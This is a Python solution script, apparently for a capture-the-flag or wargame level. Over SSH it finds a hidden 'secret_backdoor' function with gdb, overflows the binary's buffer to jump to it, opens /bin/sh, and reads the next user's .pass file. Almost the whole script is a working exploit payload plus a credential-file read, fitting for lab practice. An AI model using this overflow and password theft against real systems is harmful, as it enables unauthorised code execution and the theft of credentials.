import os
import sys

bool('Ressources' in os.getcwd()) if sys.path.append("../") else sys.path.append("../..")
from utils.ssh import exec, connect_by_previous, get_func_address
from utils.text import print_output, print_title
from utils.base import save_token, address_to_string

client = connect_by_previous()

files_list = exec(client, 'ls', title='Get files list')
print_output(files_list, 'Files')
print_title('Test this file')

binary_name = files_list[0]

output = exec(client, f'echo "" | ./{binary_name} test', title='Simple execute binary with test arg')
print_output(output)

func_info = exec(client, f'echo "info func" | gdb ./{binary_name} -q | egrep " secret_backdoor| main"', title='Get all functions')
print_output(func_info)
print_title('Secret backdoor... Exist, but not used anywhere, try to call it')


secret_backdoor_address = get_func_address(client, 'secret_backdoor')
print_output(secret_backdoor_address)

print_title('Time to overflow trick')

f = lambda cmd: exec(client, f"""echo "{cmd}" | (python -c "print '.' * 40 + '\\xda\\n' + '.' * 200 + '{address_to_string(secret_backdoor_address)}\\n' + '/bin/sh\\n'"; cat) | ./{binary_name}""")

print_output(f('whoami'))
print_title('We are end!')

print_title('Steal the password')
token = f('cat /home/users/end/.pass')[0]

save_token(token)
print_title("It's all, no more next levels :(")
